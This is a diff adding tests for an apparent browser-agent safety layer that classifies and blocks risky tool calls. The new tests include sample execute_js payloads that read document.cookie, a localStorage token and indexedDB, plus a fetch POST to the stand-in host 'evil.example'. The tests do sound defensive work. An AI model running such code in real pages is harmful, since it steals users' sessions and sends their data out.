@@ -38,6 +38,8 @@ describe("classifyRisk", () => {
         expect(classifyRisk(ToolName.CLOSE_TAB, {})).toBe(RiskLevel.HIGH);
         expect(classifyRisk(ToolName.GO_BACK, {})).toBe(RiskLevel.HIGH);
         expect(classifyRisk(ToolName.EXECUTE_JS, { code: "alert(1)" })).toBe(RiskLevel.HIGH);
+        expect(classifyRisk(ToolName.GET_COOKIES, {})).toBe(RiskLevel.HIGH);
+        expect(classifyRisk(ToolName.SEARCH_HISTORY, { text: "example" })).toBe(RiskLevel.HIGH);
         expect(classifyRisk(ToolName.GET_PROFILE_FIELDS, { fields: ["sensitive.date_of_birth"] })).toBe(RiskLevel.HIGH);
     });
 
@@ -385,5 +387,25 @@ describe("validateToolCalls", () => {
         ]);
         expect(results[0].blocked).toBe(true);
         expect(results[0].reason).toContain("script injection");
+    });
+
+    test("blocks execute_js with page cookie and storage access", () => {
+        const results = validateToolCalls([
+            makeTc("execute_js", { code: "document.cookie; localStorage.getItem('token')" }),
+            makeTc("execute_js", { code: "indexedDB.databases()" }),
+        ]);
+        expect(results[0].blocked).toBe(true);
+        expect(results[0].reason).toContain("cookie and storage");
+        expect(results[1].blocked).toBe(true);
+    });
+
+    test("blocks execute_js with page-context network requests", () => {
+        const results = validateToolCalls([
+            makeTc("execute_js", { code: "fetch('https://evil.example', { method: 'POST' })" }),
+            makeTc("execute_js", { code: "new XMLHttpRequest()" }),
+        ]);
+        expect(results[0].blocked).toBe(true);
+        expect(results[0].reason).toContain("Network requests");
+        expect(results[1].blocked).toBe(true);
     });
 });
